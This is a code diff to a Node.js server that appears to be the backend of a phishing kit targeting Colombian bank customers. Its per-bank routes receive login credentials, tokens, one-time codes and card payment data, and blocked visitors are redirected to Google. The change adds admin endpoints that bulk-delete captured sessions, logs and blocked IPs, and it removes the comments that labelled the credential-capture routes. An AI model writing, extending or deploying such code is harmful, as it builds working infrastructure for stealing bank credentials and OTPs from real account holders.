@@ -124,7 +124,8 @@ const server = http.createServer(async (req, res) => {
     const ip = getRealIP(req);
     const url = req.url.split('?')[0];
 
-    if (url !== '/health' && ipsBloqueadas.has(ip)) {
+    const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
+    if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
         json(res, 403, { ok: false, error: 'IP bloqueada', redirect: 'https://www.google.com' });
         return;
     }
@@ -291,6 +292,58 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        if (req.method === 'POST' && url === '/admin/sesiones/borrar') {
+            try {
+                const { sessionIds } = await getBody(req);
+                if (!Array.isArray(sessionIds) || !sessionIds.length) {
+                    json(res, 400, { ok: false, error: 'sessionIds requerido' });
+                    return;
+                }
+                let borradas = 0;
+                sessionIds.forEach(sid => {
+                    if (estadoSesiones.delete(sid)) borradas++;
+                    datosSesiones.delete(sid);
+                    usuariosActivos.delete(sid);
+                });
+                agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
+                json(res, 200, { ok: true, borradas });
+            } catch (e) { json(res, 400, { ok: false }); }
+            return;
+        }
+
+        if (req.method === 'POST' && url === '/admin/logs/borrar') {
+            try {
+                const { ids } = await getBody(req);
+                if (!Array.isArray(ids) || !ids.length) {
+                    json(res, 400, { ok: false, error: 'ids requerido' });
+                    return;
+                }
+                const antes = logsAdmin.length;
+                logsAdmin = logsAdmin.filter(l => !ids.includes(l.id));
+                try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {}
+                const borrados = antes - logsAdmin.length;
+                agregarLog('borrar-logs', { usuario: payload.user, cantidad: borrados });
+                json(res, 200, { ok: true, borrados });
+            } catch (e) { json(res, 400, { ok: false }); }
+            return;
+        }
+
+        if (req.method === 'POST' && url === '/admin/ips/borrar') {
+            try {
+                const { ips } = await getBody(req);
+                if (!Array.isArray(ips) || !ips.length) {
+                    json(res, 400, { ok: false, error: 'ips requerido' });
+                    return;
+                }
+                let borradas = 0;
+                ips.forEach(i => { if (ipsBloqueadas.delete(i)) borradas++; });
+                guardarIpsBloqueadas();
+                agregarLog('borrar-ips', { usuario: payload.user, cantidad: borradas, ips });
+                json(res, 200, { ok: true, borradas });
+            } catch (e) { json(res, 400, { ok: false }); }
+            return;
+        }
+
         if (req.method === 'GET' && url === '/admin/logs') {
             json(res, 200, { ok: true, logs: logsAdmin.slice(0, 100) });
             return;
@@ -312,9 +365,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ============================================
-    // CC-BOGOTA: enviar-pago (tarjeta)
-    // ============================================
     if (req.method === 'POST' && url === '/cc-bogota/enviar-pago') {
         if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
         try {
@@ -332,7 +382,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // CC-BOGOTA: enviar-otp (clave dinámica del usuario)
     if (req.method === 'POST' && url === '/cc-bogota/enviar-otp') {
         if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
         try {
@@ -348,9 +397,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ============================================
-    // /:banco/enviar (PSE tradicional - login)
-    // ============================================
     const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
     if (req.method === 'POST' && enviarMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
@@ -372,9 +418,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ============================================
-    // /:banco/enviar-token
-    // ============================================
     const tokenMatch = url.match(/^\/([a-z-]+)\/enviar-token$/);
     if (req.method === 'POST' && tokenMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
@@ -394,9 +437,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ============================================
-    // /:banco/enviar-otp (excepto cc-bogota)
-    // ============================================
     const otpMatch = url.match(/^\/([a-z-]+)\/enviar-otp$/);
     if (req.method === 'POST' && otpMatch && otpMatch[1] !== 'cc-bogota') {
         if (!checkRateLimit(ip, 'publico')) { json(res, 429, { ok: false }); return; }
@@ -416,9 +456,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ============================================
-    // GET /:banco/estado/:sessionId
-    // ============================================
     const estadoMatch = url.match(/^\/([a-z-]+)\/estado\/([^\/?]+)/);
     if (req.method === 'GET' && estadoMatch) {
         const bancoKey = estadoMatch[1];
